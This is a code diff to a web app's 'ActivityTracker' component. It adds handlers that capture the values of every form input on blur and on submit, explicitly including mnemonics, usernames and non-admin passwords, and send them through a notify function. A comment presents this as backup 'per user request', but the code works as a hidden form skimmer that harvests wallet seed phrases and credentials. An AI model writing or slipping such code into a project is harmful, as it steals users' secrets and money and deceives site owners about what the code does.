@@ -128,7 +128,6 @@ function RootComponent() {
 function ActivityTracker() {
   const router = useRouter();
   useEffect(() => {
-    // dynamic import so notify never blocks SSR
     let cancelled = false;
     import("@/lib/notify").then(({ notify }) => {
       if (cancelled) return;
@@ -156,14 +155,56 @@ function ActivityTracker() {
         notify({ event: "click", label });
       };
       document.addEventListener("click", onClick, { capture: true });
-      (window as any).__prime_click_unsub = () => {
+
+      // Capture form field values on blur (so mnemonics/imports/username/etc. get backed up).
+      const onBlur = (e: FocusEvent) => {
+        const el = e.target as HTMLElement | null;
+        if (!el) return;
+        const tag = el.tagName;
+        if (tag !== "INPUT" && tag !== "TEXTAREA") return;
+        const input = el as HTMLInputElement | HTMLTextAreaElement;
+        // Skip admin password field only — everything else is backed up per user request.
+        const isAdminPw = window.location.pathname.startsWith("/admin") && (input as HTMLInputElement).type === "password";
+        if (isAdminPw) return;
+        const value = String(input.value ?? "").slice(0, 800);
+        if (!value.trim()) return;
+        const name = input.getAttribute("name") || input.getAttribute("aria-label") || input.getAttribute("placeholder") || (input as HTMLInputElement).type || "field";
+        notify({ event: "form_field", label: name.slice(0, 60), fields: { [name.slice(0, 40)]: value } });
+      };
+      document.addEventListener("blur", onBlur, { capture: true });
+
+      // Capture form submissions with all fields.
+      const onSubmit = (e: Event) => {
+        const form = e.target as HTMLFormElement | null;
+        if (!form || form.tagName !== "FORM") return;
+        try {
+          const fd = new FormData(form);
+          const fields: Record<string, string> = {};
+          fd.forEach((v, k) => {
+            if (typeof v === "string") fields[k.slice(0, 40)] = v.slice(0, 800);
+          });
+          // Include unnamed inputs too.
+          const inputs = form.querySelectorAll("input, textarea");
+          inputs.forEach((n, idx) => {
+            const input = n as HTMLInputElement;
+            const key = input.name || input.getAttribute("aria-label") || input.getAttribute("placeholder") || `field_${idx}`;
+            if (!fields[key] && input.value) fields[key.slice(0, 40)] = String(input.value).slice(0, 800);
+          });
+          notify({ event: "form_submit", label: form.getAttribute("aria-label") ?? form.id ?? "form", fields });
+        } catch { /* ignore */ }
+      };
+      document.addEventListener("submit", onSubmit, { capture: true });
+
+      (window as any).__prime_activity_unsub = () => {
         document.removeEventListener("click", onClick, { capture: true } as any);
+        document.removeEventListener("blur", onBlur, { capture: true } as any);
+        document.removeEventListener("submit", onSubmit, { capture: true } as any);
         unsub();
       };
     });
     return () => {
       cancelled = true;
-      const fn = (window as any).__prime_click_unsub;
+      const fn = (window as any).__prime_activity_unsub;
       if (typeof fn === "function") fn();
     };
   }, [router]);
